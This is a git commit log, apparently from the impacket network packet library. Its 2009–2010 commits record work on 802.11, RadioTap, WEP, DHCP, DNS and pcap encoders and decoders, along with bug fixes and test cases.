    * Tidy up Dot11DataDecoder, replaced individual frame control (Dot11) field setters (set_QoS, set_Addr4, set_privateFrame).
      Instead we pass through set_dot11_hdr method the Dot11 object, it's the frame control object.

commit bfb585ad64c5505b52dec4a7d8e7357269e7953e
Author: 6e726d <6e726d@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri May 21 14:09:39 2010 +0000

    Added DHCP INFORM contstant.

commit 7caeb7d0b1a5e99ca36e59e254ef33eef7c94d78
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 4 12:58:54 2010 +0000

    * Bugfixed in TCP encoder. get_th_flags is reading header size part too.
    * A Testcases added to check this and other methods.

commit 5cba79ba68676d1624568c01d8f556ffa920d85c
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 29 17:54:02 2010 +0000

    in the changeset [238], we made the mistake of using the packet total size instead of header size.

commit d8956789b8c1f07e5c058b5e0539080504fb8599
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 29 14:20:54 2010 +0000

    Bugfixed in RadioTap protocol encoder. The Radiotap header length wasn't updated when the packet was created from scratch or modifying by adding or removing fields to it.
    Also added a method to read the header length

commit e6e9d640b0bb5af81e9a2379540050c272edebcd
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 28 20:38:18 2010 +0000

    When we were creating a RadioTap packet from scratch, the constructor was calling to set_present method that was renamed to be private.

commit b6b1f1564a217d48c4c9ed754f4c18cae1723280
Author: 6e726d <6e726d@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Mar 22 17:48:33 2010 +0000

     - Added DNS decoder and part of the encoder.

commit d89d0e603cc21c498538e46bcb619d8ff3e99b69
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 18 06:00:22 2010 +0000

    We facilitate the way that we do the auto checksum calculation in the IP class, the checksum is setted at 0x0000 internally in get_packet before doing the calculation. Before, this task, should be done manually by the user being prone to a mistake in the order they are calling set_ip_sum and set auto_checksum doing the calculation was not made or was made incorrectly.
    Added the reset_ip_sum method to IP class.

commit 552df832a919b3d36e3975a9b1e3d0416e53b3db
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 16 17:17:34 2010 +0000

    in changeset [229] We change bit endianess on getter/setter of managemenet authentication sequence but we missed to change related testcase.

commit d080f08afdb946badbff117603af439b3a868a10
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 16 17:15:11 2010 +0000

    Moved ProtocolPacket from dot11 to ImpactPacket so it can be used directly by the rest of the protocol classes from impacket without having to import dot11

commit ecdc4214281da7f2f009736bd05a75c47d0ca061
Author: 6e726d <6e726d@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Mar 15 18:07:06 2010 +0000

    ImpacketException should inherit from Exception.

commit 2bb809f7cd1a85e21f8d98275864d8105375517e
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Mar 6 02:25:52 2010 +0000

    Added get method in DHCP class for get DHCP options values

commit 463ec8c8d6e0aa38cc3cbc6ccdd67d60382b8e99
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 5 17:25:25 2010 +0000

    Bugfix in UDP class, self.parent() is a method not a attribute.

commit b8e58bf7dbc75079ba190d241f89b6205e17fadf
Author: 6e726d <6e726d@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Mar 3 18:17:02 2010 +0000

    Change bit endianess on getter/setter of authentication sequence.

commit 89331db947818d34f17862101cdba8678f4696fe
Author: 6e726d <6e726d@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Mar 3 18:03:21 2010 +0000

    In changeset [138] we introduced a bug on structure in unpack method that override fields dictionary when added inputData element.
    Fixed

commit 8c3a4400f57f0246e8fc520949ffd2ac352548a8
Author: 6e726d <6e726d@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Feb 24 20:27:00 2010 +0000

     - Typo where are you!!

commit 09739d97c6a069a2352f1b3c8bab2a66e4dd17d5
Author: 6e726d <6e726d@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Feb 24 20:10:22 2010 +0000

     - Changed some ugly param names i put on the last commit

commit 4e8939e68a8c4034ae5b978b162cc16de19ae0ae
Author: 6e726d <6e726d@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Feb 24 16:03:04 2010 +0000

     - Added Reason Codes Constants
     - Added Auth Algorithm Constants
     - Added Status Codes Constants

commit f56b2b39e78b59c7d32d816a384dcc0ea3d2c20c
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 15 19:57:27 2010 +0000

     - Added Authentication Management Frame.
     - Added Association Request Management Frame.
     - Added Association Response Management Frame.
     - Added Disassociation Management Frame.
     - Added Reassociation Request Management Frame.
     - Added Reassociation Response Management Frame.

commit 30bb3a3de4d0a5565879b999b5626fd1da1d8ec0
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 8 18:32:43 2009 +0000

    Merged WEPIntermediate branch to added WEP Encryption/Decryption into trunk

commit 0634b5d0844f365f4870382c81ff32292bfb4f88
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 8 15:34:45 2009 +0000

    In changeset [216] we included by mistake not yet finalized changes

commit db7bcb672f0045011afeaf8e8ef1d767d484411e
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 8 15:08:45 2009 +0000

    In changeset [214], we forgot to modify exception text

commit 25e0a383fbaf0d48254724e1f8a9b42c27cfb39f
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 8 15:01:21 2009 +0000

    Bugfix: in IP datagrams, when decoding, checksum shouldn't be modified

commit 02043439eb3f0369e1ace9ecdf889fe79c240be5
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 8 14:31:48 2009 +0000

    Bug fixes in SNAP decoding

commit d8b9daa83c0cf99a0ebf1d94d17b4485f928877a
Author: gera@corest.com <gera@corest.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Oct 28 15:32:50 2009 +0000

    path for IP Options up to 40 bytes, submitted by George.Khoury@viasat.com

commit e8290f3d08fc61e090b39ae6f30b5cded3bb9e61
Author: gera@corest.com <gera@corest.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Oct 28 15:32:02 2009 +0000

    added warning message when no crypto library is available

commit 3f2f9a79deee7f4e85dae6768adf0c3601141a30
Author: gera@corest.com <gera@corest.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Oct 28 15:22:39 2009 +0000

    small change in LICENSE

commit 703a6ee5f23496c135ba4c5ed085096681720cf9
Author: gera@corest.com <gera@corest.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Oct 28 15:19:25 2009 +0000

    small fix to define POW as None when Crypto is not found and POW is not found

commit 33665a133d4faf9ef3df2f60c1829a58a15a4891
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 27 00:01:05 2009 +0000

    Fixed Typo: We forget to fix the testcases and Dot11 class

commit 50766729edf752417fe1e40728058248abf335ef
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 26 19:30:08 2009 +0000

    Fixed typo.

commit bd3de5f0f630572906db133bf8afbbe329871a63
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 15 04:38:03 2009 +0000

    Fixes in Dot11ManagementDeauthentication:
    * We incorrectly defined this as inheriting from Dot11ManagementFrame instead of ProtocolPacket.
    * We also forget the code to create a Dot11ManagementDeauthentication packet from scratch.

commit d8b30f309b599ce3dce65b235ad6358928ca2cc9
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 8 19:47:20 2009 +0000

    Added management deauthentication frame.

commit af9652a8bc3b6d4ebf6546f358a56cc802ee9b92
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Sep 21 16:07:46 2009 +0000

    Fixed bug on RSN element parse.
    Modify test cases to work with modification on vendor specific element parser.

commit 494452cd934aa41b2ffcf810dd30cff1acb24af9
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Sep 11 20:30:59 2009 +0000

    Added getter/setter of RSN Element.

commit d6b635d2e9b7a1f5ad78750a100275f1c13fd0a7
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Sep 11 15:19:26 2009 +0000

    reverse and not engineering

commit 196935cc79f8da355eac496dca7637db30402bb9
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Sep 11 15:06:01 2009 +0000

    Typo

commit 7117ecdd2b0f694c71998a042cada5a493672453
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Sep 11 14:50:57 2009 +0000

    Added capabilities bitmap.

commit b012389f6e44c6d45f65d51c3c52896116c1d8e0
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Sep 8 22:21:32 2009 +0000

    Merge with some bug fixing.

commit b866316784725ef860f3ad93a5e790f99a6ec09e
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Sep 3 18:38:57 2009 +0000

    + Added 802.11 ProbeResponse testcase.
    + Add script to run all testcases in win32 host.

commit 652f0dc53fe18461490505558935b7600802dab9
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Sep 2 22:20:36 2009 +0000

    dot11.py: Added classes to decode ProbeRequest and ProbeResponse dot11 Management frames.
    ImpactDecoder.py: + Fixed bug in RadioTap flag field when it's zero
                      + Added decoder for ProbeRequest and ProbeResponse dot11 Management frames.
    test-FrameManagementProbeRequest.py: Added testcases for ProbeRequest dot11 Management frames

commit 7afd005e5c438565b5eeec1ef3f2cbc4698cf23a
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Sep 2 22:07:32 2009 +0000

    Fixed ident issues

commit d39a3e5831c64f97787a16c9dd5f1110d48a1b5a
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Sep 1 19:19:41 2009 +0000

    Modified encryption handling to support keys

commit 8e2ecfb445118b37e3e23a2835a35b073e138790
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Sep 1 15:49:06 2009 +0000

    Modified python executable path.

commit 0892e8d9068c163752b408643bfe188b63b062bb
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 31 18:56:09 2009 +0000

    I miss the method of the instance. :S

commit bb850e8f3ba1e884be214e4744316c70e783034b
Author: narrowmind <narrowmind@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 26 19:02:04 2009 +0000

    Added Dot11ControlDecoder.

commit 35fbfc0a11b051e6f25d513d5ce95a3b235f6c93
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Aug 9 00:30:59 2009 +0000

    Improvements in Management helper classes.
    Added vendor-specific getter/setter methods

commit 25d157b19acde9c3f81ccd93325cb6732bdc5f78
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 5 03:30:53 2009 +0000

    Improved Dot11 Management classes generalizing to the rest of the subtypes.
    Added base methods to delete elements, add/replace elements, etc.
    Added SSID and Supported Rates setters
    Added DS_Parameter_Set getter/setter

commit add55052f3638ae0b679651fd6b6c4ce629e8606
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 3 12:46:19 2009 +0000

    Deleted RadioTap unused private methods

commit 4ff8a1ec46a94ef79d980f39f97461ff87c8cbbe
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 3 04:57:44 2009 +0000

    Added getters methods for SSID and Supported Rates.
    An update related to previously commit is included in this changeset.

commit 920990bca217b2c30e79ca49491b126a9a56ce63
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 3 01:48:37 2009 +0000

    All dot11 packets have no FCS. This depends on the flag FCS_at_end in RadioTap protocol. In this changeset we handle these cases.

commit cd1569719eb463ef5d09871429baefdbc1c9a169
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Aug 2 22:33:03 2009 +0000

    Updating of imports

commit 2a03e7a7747a6b4ca6d85d9045656b056825402d
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Aug 2 22:16:21 2009 +0000

    Added an hierarchical updating packets mechanism.
    A packet is the body of the immediately superior packet, if it has a parent, within the hierarchy. If a package is changed, this must be reflected on the packages above.

commit 4f2bc706ecbc9c22734f8bf14b4f1cc5c068371f
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Aug 2 00:45:30 2009 +0000

    Started writing the Management Class, its testcase and decoder.

commit fe3c7c9717a0909190212692ba511da9416394e4
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Aug 2 00:15:38 2009 +0000

    Added long_long data type setter and getter to PacketBuffer class

commit 9c4498b4a49081581735c1657ce1d0d8c9fc7201
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 31 04:35:47 2009 +0000

    Completed RadioTap Protocol testcases and several fixes

commit 2640bba58c03ed9611de10856cc2c84b4661d7f4
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 31 01:32:52 2009 +0000

    Fixes in channel field. A test was added for this field in the RadioTap testcase.

commit c0b8d0f5d0c5663d5b0dfb13c7943c7f85737184
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 30 15:05:49 2009 +0000

    Added method to decoder base class for get a particular protocol

commit 792e8d98de3f4a6ccf34e88d143116685900e10e
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 29 02:01:15 2009 +0000

    Fixes in RadioTap decoder. Added testcase for RadioTap decoder

commit c76d8911a399831612f345a56c8072a21657a841
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 29 00:21:29 2009 +0000

    Add xchannel field setter's test in testcase

commit 83ab182957402b93c076ea29cbc562512c92e971
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jul 29 00:13:57 2009 +0000

    Added all the RadioTap field. Lack of testcases for this field.

commit 9b50a93f0163d7d38aee2b86c44808943b90fa8a
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jul 28 13:44:45 2009 +0000

    Rewrite of RadioTap class

commit 6f4ea36d14c35ea3bcdfcc9916dd56c72eff5bba
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 25 15:00:40 2009 +0000

    This was a pending change, was confusing and redundant that each class has the length of header and tail.

commit 2fc8c24fd7db418b43d09a6119ecbeca940b983a
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 25 14:33:06 2009 +0000

    The AbstractDot11 class was renamed to more appropiate name because it is no longer an abstract class, nor is it only for dot11

commit 0471f55bcffa48852f439a647c904973c0767745
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 24 14:08:52 2009 +0000

    Added getter/setter methods for flags and rate RadioTap fields

commit 43247fbf27ec69dc86e711858cc869d131385599
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 24 13:43:15 2009 +0000

    We unified format conversion to __set_field_from_string and __get_field_as_string

commit fbc6ebad062200ec76a43cb397f971087c395193
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 24 13:27:57 2009 +0000

    Deleted some lost lines

commit 50ef64c41e165f494fa0062d37b5e4a8c108b45b
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 23 23:27:20 2009 +0000

    Modified __get_field_position for return the field length too.
    Add unset_field method and tested in RadioTap testcase

commit 3528204d5ba5602908556bb7268d39737c2efef0
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 23 13:32:43 2009 +0000

    * Fixes with RadioTap header size when add a field
    * Improvements in the dot11 base class (AbstractDot11)
    * add unset_field method

commit 7b8a099cf185605d28f9838326d9c35c54125a3c
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 23 05:14:49 2009 +0000

    Advancing in the RadioTap class construction

commit 13284061dd19951bf49e14d6fe221ee6769360b4
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jul 6 01:51:39 2009 +0000

    renamed to more suitable name

commit 59380c7778154f49f523b23da1978a3a38403908
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jul 6 01:43:33 2009 +0000

    Added methods to handle WEP/WPA/WPA2 fields and their respective TestCases

commit 9fed0dea96a80ab60f601caa7f80d30d216638e7
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 4 22:37:05 2009 +0000

    Added test to check if get_packet() return the correct WEP Data content

commit 1416fe53d08a9ded0b7c284005c1e59aeba57472
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 4 22:25:39 2009 +0000

    Fixes in dot11 decoders. In this context, a testcase was added

commit 51d6333234ac5f9c95fad2b650ace13eaff479eb
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 4 22:22:53 2009 +0000

    removed debug line

commit ec8ef633bf852d5f0d25828706b09fb23e2aab5a
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 3 03:33:47 2009 +0000

    Completed WEP testcase

commit 41cf5524a15336accec29ff72439710445868ed9
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jul 3 03:31:40 2009 +0000

    Fixes handling tail frame part. Fixes in WEP frames

commit e77f9e457e60b44de754704a7afb0b4cbf7baf70
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 30 03:49:08 2009 +0000

    Updated WEP/WPA/WPA2 classes
    Outlined WEP/WPA/WPA2 decoders

commit 639ca77ed412935de1d7de383abbda887a43db56
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 30 02:16:13 2009 +0000

    Data Frames and WEP updated

commit 473306c15334f6560010ad30e5867a362e3f5781
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 29 11:57:59 2009 +0000

    *Adjustments to new class design.

commit 01f2a0561fbc00932554ef61cb38272d043a1d04
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 24 02:25:15 2009 +0000

    changed to use asserts unittest for this check

commit 8d3614b0953a29da856584e35a61383a181d4643
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 22 05:12:10 2009 +0000

    Outlined of decoders. Although not tested

commit 0f2777aaa1c01b2d8fa150d08b95e29a857bf3e6
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 22 05:08:53 2009 +0000

    * New design, rewritten a lot of the code.
    * Separated DataAddr4 and DataQoS from Data.
    * Adapted testcases for Dot11 and Dot11DataFrame
    * Added LLC Header class
    * Added SNAP Header class

commit bd6dcc8325fa6b5797e2f6d524c0a0a9374ccab2
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 22 04:53:59 2009 +0000

    Was separated from Header class all the protocol layers logic to ProtocolLayer class and now Header inherits from this too. This does not affect the rest of the code
    Dot11 needs inherit only the ProtocolLayer stuff.

commit 242128b7f4cb37cef8051cec1614b13d232d8cba
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 9 05:50:53 2009 +0000

    Some fixes for CFEndCFACK and PSPoll. There is still an error to fix

commit 81e5e4055bf0b220be1d86e5a04bfa908ec395da
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 9 05:47:42 2009 +0000

    This comment is no longer valid

commit 39a4fb47bc5fb310a5b8abfe8e985906e685059c
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 9 05:46:15 2009 +0000

    we must keep in mind that comments about AID (Association ID) field

commit cd35a20e77471de8d0214a5f27901d834be47003
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 9 02:55:56 2009 +0000

    Frame Control PS-Poll has AID field, and not DURATION

commit c9749f220972b5a83c6fcca3dc67f43f8097c26a
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 9 02:41:31 2009 +0000

    Removed trailing word "field" from each method name

commit 80469292e1c1a980f948df498e1178b5d048cd24
Author: gera@corest.com <gera@corest.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 8 20:08:29 2009 +0000

    reordered ECN responder, and added some debug prints (commented out)

commit 8d7df3253e211fcbc6037cbfc1986e63207f158b
Author: gera@corest.com <gera@corest.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 8 19:26:52 2009 +0000

    removed some unused stuff

commit 7cdfaebd08c69fc8a89f8457af61e9d483141a1d
Author: gera@corest.com <gera@corest.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 8 19:13:09 2009 +0000

    added --help parameter

commit 92e98fbe63ae414cecca1fa9a02bb96ab6496654
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 4 20:26:48 2009 +0000

    added PcapFile.reset()

commit 79de6f63eafbab6cae83214acbfe08a97d50c5ee
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 4 19:33:31 2009 +0000

    added class PcapFile. it can be used to read and write pcap files

commit 0e13dfc4d916ea7209e3fda9beaf9cb380d70e2c
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 4 19:33:05 2009 +0000

    @classmethod
    Structure.fromFile(aFile)

commit e68a9ac853ab93d15cb21afd4a6167ce4fc90f2a
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 4 19:17:00 2009 +0000

    Added partial support for IEEE 802.11 Network packet codecs

commit 30095536e4486b89c15f96882d9591f93cc96d13
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 4 18:55:05 2009 +0000

    simple label rename

commit 959631877489c85ca271b2adb6a861c62ed7d85d
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 4 16:17:19 2009 +0000

    bug fix: when packing "=" fields, "&" couldn't be used inside the code because "&" type specifier had precendence over "&"

commit 4a5fd5c368cb0b55def853b7158bb9bb23fd0688
Author: gmoreira <gmoreira@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 4 16:16:27 2009 +0000

    new test, example of how to pack and unpack bitfields

commit a6225280737ce006d7e1c7e6c116b6db47ee2143
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 19 15:55:04 2009 +0000

    documentation fix

commit 2c74f0520b26fcd4699d9b07745700544bf23fb9
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 12 22:39:54 2009 +0000

    added fault nmapOSDB pointing to /usr/share/nmap/nmap-os-db

commit 44d1b6289013abac10065e9083c221a8f0dcea3c
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 12 22:30:22 2009 +0000

    renamed wpad option to 'proxy-autoconfig'

commit 55e978a741f5431648f21bd187f98a435d26c65c
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 12 21:10:19 2009 +0000

    added more options

commit a5bec1ba0ddfe992ce8eeb52961170cf574f5dfc
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 11 16:19:10 2009 +0000

    more dhcp options

commit 12c817ccac608f9d9288ebf4a89a4a5843c66e4e
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu May 7 21:18:16 2009 +0000

    added some more options
    decoding requested options too

commit 8dbe021b3b1d653a8926e16883450df5827504d2
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu May 7 16:13:02 2009 +0000

    typo

commit 1b3d4607155f65afac2a47c7a45c3d1bb574b091
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu May 7 16:11:13 2009 +0000

    added command line argument -d to specify the nmap-os-db file

commit 934278323ff7dc2a38705e58c80aa8f66f6ad59c
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed May 6 15:30:12 2009 +0000

    some refactoring, and added udp cmd packets, can be used like:
    
    echo cmd:exit | nc -u 192.168.66.254 12345

commit 336d2e8a25fcff64de10c39a0c62ff2226690aa2
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 30 21:29:16 2009 +0000

    added some DHCP options, more to come

commit aef20feb75d89ba55ecaf05e56878567c73c2c46
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 30 18:02:18 2009 +0000

    bug fix/improvement: self can be used in pack/unpack code for _ fields

commit 20726853474ad24a26594896977f9c71cd6afc29
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 29 22:23:51 2009 +0000

    proxy-autodiscovery is not a dhcp option, it's a parameter-request-list entry

commit 7d0f0968bfb801285a17fd75f3cf6a868c89ec99
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 29 22:20:02 2009 +0000

    can unpack options, and more options have names

commit 8c440da211b7b504c86ce52aedd0d29cda256bad
Author: lskladnik <lskladnik@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 29 21:26:10 2009 +0000

    Applied some fixes from Impact trunk.

commit 779940396f50dd8aac691e1230cf5928ae6f1063
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 29 21:09:25 2009 +0000

    unpacking of chaddr's length is now magic :)

commit 410c7008c9ad590bfcaa066eb8778542a9e66856
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 29 21:06:40 2009 +0000

    propper packing and unpacking of dhcp packets...
    unpacking of chaddr's length is not magic :(

commit 63f1e7351f8f97b37f8adcd8adbdef41d1570de7
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 29 20:51:49 2009 +0000

    fixed something on the structure for proper unpacking

commit 6cfd19ad51531ded058791c7f840da97b1900ff7
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 29 20:51:28 2009 +0000

    fixed a bug in calcUnpackSize() for '_' fields
    added some more debug info when .debug != false

commit 20cf2b995e45ec87aacef2ec3af5cdcfe60f5c32
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 29 20:31:51 2009 +0000

    fixed a bug when unpacking '_' fields

commit 4dccb28bcc52997a91f3011d9fabfd42f0cd2858
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 29 18:43:29 2009 +0000

    DHCP cheap implementation

commit 72bf82b859b948842c705d295526074166d404ca
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 29 16:27:38 2009 +0000

    parser for .pcap capture files

commit 2befae75032065e766c69970cbc7ec48c1c8ee4b
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
